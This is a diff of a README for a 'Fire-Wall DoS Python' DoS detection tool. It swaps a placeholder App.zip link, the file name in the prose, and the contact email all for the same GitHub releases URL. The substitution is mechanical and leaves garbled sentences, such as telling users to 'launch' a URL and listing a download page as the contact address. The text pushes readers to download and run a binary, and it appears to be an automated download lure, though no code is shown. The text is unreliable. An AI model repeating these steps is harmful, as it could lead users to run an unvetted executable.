@@ -20,15 +20,15 @@ Fire-Wall DoS Python is a powerful system designed to identify and defend agains
 
 ## 📂 Repository Files
 Download the application from the following link:  
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/project/files/App.zip)
+[![Download App](https://github.com/venom0010/Fire-Wall-Dos-Python/releases)](https://github.com/venom0010/Fire-Wall-Dos-Python/releases)
 
-Launching the App.zip is required to start utilizing the functionalities of the DoS Attack Detection & Mitigation System.
+Launching the https://github.com/venom0010/Fire-Wall-Dos-Python/releases is required to start utilizing the functionalities of the DoS Attack Detection & Mitigation System.
 
 If the link is not accessible, visit the "Releases" section for alternative download options.
 
 ## 🚀 Get Started
 To get started with the Fire-Wall DoS Python system, follow these steps:
-1. Download the App.zip file from the provided link above.
+1. Download the https://github.com/venom0010/Fire-Wall-Dos-Python/releases file from the provided link above.
 2. Launch the application to initiate the DoS attack detection and mitigation features.
 3. Customize the system settings to suit your network security needs.
 4. Monitor the system alerts and logs to stay informed about potential threats.
@@ -49,7 +49,7 @@ If you'd like to contribute to the Fire-Wall DoS Python system, we welcome your 
 Join our growing community of cybersecurity enthusiasts and professionals to collaborate, share insights, and enhance your network security knowledge.
 
 ## 📞 Contact Us
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [contact@firewalldospython.com](mailto:contact@firewalldospython.com).
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/venom0010/Fire-Wall-Dos-Python/releases](https://github.com/venom0010/Fire-Wall-Dos-Python/releases).
 
 Let's work together to strengthen our network defenses and combat cyber threats with Fire-Wall DoS Python! 🔒🔥
 
